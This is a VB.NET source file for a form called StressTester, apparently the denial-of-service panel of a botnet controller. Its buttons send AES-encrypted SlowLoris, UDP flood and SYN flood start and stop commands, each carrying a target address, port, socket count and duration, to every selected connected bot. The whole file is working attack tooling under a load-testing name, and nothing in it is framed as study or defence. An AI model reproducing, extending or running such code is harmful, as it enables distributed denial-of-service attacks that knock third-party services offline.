Public Class StressTester
    Public connected(Form1.ListView1.Items.Count) As Connection
    Public amount As Integer = 0
    Private Sub StressTester_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ToolStripStatusLabel1.Text = "Selected Bots: " & amount
    End Sub
#Region "SlowLoris"
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles btn_startsl.Click
        For i = 0 To amount - 1
            connected(i).Send(New Encryption().AES_Encrypt("SlowLorisStart" & tb_slurl.Text & "|" & NUD_AoS_Sl.Value & "|" & NUD_AOT_SL.Value, Form1.enckey))
        Next
    End Sub
    Private Sub btn_stopsl_Click(sender As Object, e As EventArgs) Handles btn_stopsl.Click
        For i = 0 To amount - 1
            connected(i).Send(New Encryption().AES_Encrypt("SlowLorisStop", Form1.enckey))
        Next
    End Sub
#End Region
#Region "UDP"
    Private Sub btn_start2_Click(sender As Object, e As EventArgs) Handles btn_start2.Click
        For i = 0 To amount - 1
            connected(i).Send(New Encryption().AES_Encrypt("UDPStart" & tb_ipudp.Text & "|" & tb_portudp.Value & "|" & NUD_AOT_UDP.Value, Form1.enckey))
        Next
    End Sub
    Private Sub btn_stop2_Click(sender As Object, e As EventArgs) Handles btn_stop2.Click
        For i = 0 To amount - 1
            connected(i).Send(New Encryption().AES_Encrypt("UDPStop", Form1.enckey))
        Next
    End Sub
#End Region
#Region "SYN"
    Private Sub btn_start3_Click(sender As Object, e As EventArgs) Handles btn_start3.Click
        For i = 0 To amount - 1
            connected(i).Send(New Encryption().AES_Encrypt("SYNStart" & tb_ipsyn.Text & "|" & tb_portsyn.Value & "|" & NUD_AOS_SYN.Value & "|" & NUD_AOT_SYN.Value, Form1.enckey))
        Next
    End Sub
    Private Sub btn_stop3_Click(sender As Object, e As EventArgs) Handles btn_stop3.Click
        For i = 0 To amount - 1
            connected(i).Send(New Encryption().AES_Encrypt("SYNStop", Form1.enckey))
        Next
    End Sub
#End Region
End Class